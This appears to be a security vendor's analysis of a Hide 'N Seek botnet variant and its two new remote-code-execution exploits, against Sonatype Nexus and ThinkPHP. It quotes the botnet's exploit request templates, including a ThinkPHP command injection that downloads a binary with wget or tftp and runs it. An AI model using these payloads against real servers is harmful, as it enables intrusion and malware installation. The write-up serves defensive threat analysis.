Executive Summary

The Hide 'N Seek botnet was first discovered in January 2018 and is known for its unique use of Peer-to-
Peer communication between bots.

Since its discovery, the malware family has seen a couple of upgrades, from the addition of persistence and
new exploits, to targeting Android devices via the Android Debug Bridge (ADB).

This post details a variant of the family first seen on the 21st of February 2019, incorporating two new
exploits - CVE-2018-20062 which targets ThinkPHP installations, and CVE-2019-7238, a Remote Code
Execution (RCE) vulnerability in Sonatype Nexus Repository Manager (NXRM) 3 software installations.

While the ThinkPHP exploit has already been seen employed by several Mirai variants, the only other
instance of the CVE-2019-7238 vulnerability being exploited in the wild has been by the DDG botnet. Our
research, outlined below, shows that the Hide 'N Seek botnet incorporated this exploit back in February

2019, even before the DDG botnet.

Technical Analysis

This newest version of the Hide 'N Seek malware incorporates many of the previously seen features of the
malware family including the persistence, the incorporation of exploits, and targeting Android devices via
ADB.

In addition to exploits previously used by the malware family, this particular version is unique for its use of
the following two new exploits:

CVE-2019-7238, which is a RCE vulnerability in Sonatype Nexus Repository Manager installations
prior to version 3.15.0. While Proof of Concept (PoC) code for this vulnerability has been publicly
available since a few weeks after its public disclosure, the only other instance of it being exploited in
the wild has been by the DDG botnet in May 2019. Our research has shown, based on the first seen
date for samples of this new Hide 'N Seek version, that the first demonstrated exploitation in the wild
was actually February 2019, a full month prior to the DDG botnet. The exploit format is shown below: 

POST /service/extdirect HTTP/1.1

Host: %J

Accept: */*

Content-Type: application/json

Connection: close

Content-Length: %d

{"action":"coreui_Component","method":"previewAssets","data":[{"page":1,"start":0,"limit":50,"sort":
[{"property":"name","direction":"ASC"}],"filter":[{"property":"repositoryName","value":"*"},
{"property":"expression","value":"233.class.forName(',27h,'java.lang.Runtime',27h,').getRuntime().exec(['flock','-

%N&&./%N a%J a%J',27h,'])"},{"property":"type","value":"jexl"}]}],"type":"rpc","tid":8}

CVE-2018-20062, is an RCE vulnerability in ThinkPHP. This exploit has frequently been used by Mirai
variants in the wild since its public disclosure, however this is the first observed use of it by Hide 'N
Seek. The exploit format is shown below: 

GET /?s=/index/thinkapp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=
(wget%20http://%J/%T%20-O%20%N||/bin/busybox%20tftp%20-g%20-l%20%N%20-
r%20%T%20%I);chmod%20777%20%N;./%N%20a%J%20a%J

HTTP/1.1

Host: %J

In addition, this Hide 'N Seek variant also exploits the following vulnerabilities which it has used in the past:

CVE-2018-7297: a RCE vulnerability in the HomeMatic Zentrale CCU2.
CouchDB RCE
OrientDB RCE

2/4



Netgear DGN1000 setup.cgi RCE
AVTECH IP Camera/NVR/DVR RCE
TP-Link Routers backdoor

In addition to the two new exploits, this new variant also uses an XOR key of 0x87 for string encryption,
which is different from previously seen variants. However, the encryption scheme used is the same as has
been used by the malware family so far i.e. a cumulative byte-wise XOR. This is better explained by the
IDApython code-snippet below:

key=0x87

for addr in range(strstart, strend):

     originalbyte = GetOriginalByte(addr)

     decryptedbyte = originalbyte^(key&0xff)

     PatchByte(addr, decryptedbyte)

     key += decryptedbyte

As seen in previous samples this malware family contains a list of hard-coded peers for P2P
communication. The list of hard-coded peers in this new variant differs from samples seen in the past. The
hard-coded peer IPs and ports in these samples can be found on our Github page here.

Conclusion

Since its discovery, the Hide `N Seek P2P Linux botnet has evolved to incorporate several new exploits to
widen the range of devices it can infect. In this instance, the newly discovered variant added two recent
vulnerabilities to its arsenal. In particular, it added an exploit targeting CVE-2019-7238, which, based on the
dates of appearance of samples, makes this the earliest exploitation of the vulnerability in the wild.
